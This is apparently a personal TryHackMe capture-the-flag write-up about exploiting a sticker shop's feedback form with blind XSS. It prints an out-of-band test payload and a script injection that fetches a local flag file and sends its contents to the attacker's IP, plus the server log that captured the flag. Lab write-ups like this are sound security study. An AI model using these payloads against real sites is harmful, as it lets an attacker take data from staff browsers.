
[[TryHackMe]] Room

**Date**: 13/02/25
**Target IP**: 10.10.245.51

---

> [!NOTE] Prompt
> Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!
> 
> Can you read the flag at `http://10.10.245.51:8080/flag.txt`?

---

The /flag.txt gives a 401 unauthorized error. There's a submit feedback endpoint that suggests that staff will interact with our input.

I had to check the walkthrough. Turns out its Blind XSS. We can test for presence of Blind XSS using an OOB interaction with Interact.sh with the following payload :

```js
'"><script src=http://cumsc1ff3mbh3u2l0v10c6ipgf4cgyb1k.oast.live></script>
```

I get a DNS lookup. Next I have to figure out how to send the flag content to myself.

Have to use JavaScript and a Python HTTP server to obtain the flag :

```js
'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.4.122.80:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```

```
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.245.51 - - [13/Feb/2025 16:01:06] "GET /?flag=THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D HTTP/1.1" 200 -
```

